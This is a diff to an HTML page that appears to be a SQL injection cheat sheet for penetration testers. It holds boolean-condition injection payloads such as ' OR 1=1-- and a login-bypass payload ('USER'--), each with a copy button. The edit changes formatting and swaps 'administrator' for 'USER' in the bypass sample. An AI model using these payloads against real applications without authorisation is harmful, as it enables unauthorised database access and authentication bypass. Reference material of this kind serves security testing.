@@ -53,8 +53,8 @@ Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 I
 If the vulnerability is present the goal is to "close" the query and retrieve all, for that boolean conditions are used.
 	
 <b>C1: TRUE </b><mark id="HDT01">' OR 1=1--</mark>
-	<b>SAMPLE: </b><mark id="">' or "1"="1"#</mark>
-	<b>SAMPLE: </b><mark id="">' or 1=1-- -</mark>
+<b>SAMPLE: </b><mark id="">' or "1"="1"#</mark>
+<b>SAMPLE: </b><mark id="">' or 1=1-- -</mark>
 <b>C2: TRUE </b><mark id="HDT02">' and 'a'='a--</mark>
 <b>C3: FALSE </b><mark id="HDT03">' and 1=2;--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button></p>
@@ -65,7 +65,7 @@ If the vulnerability is present the goal is to "close" the query and retrieve al
 
 <u>SAMPLE:</u>
 	
-<b>C1: </b><mark id="LBT01">administrator'--</mark><br>
+<b>C1: </b><mark id="LBT01">USER'--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LBT01')">.C1.</button></p>
 </details>
 <details>
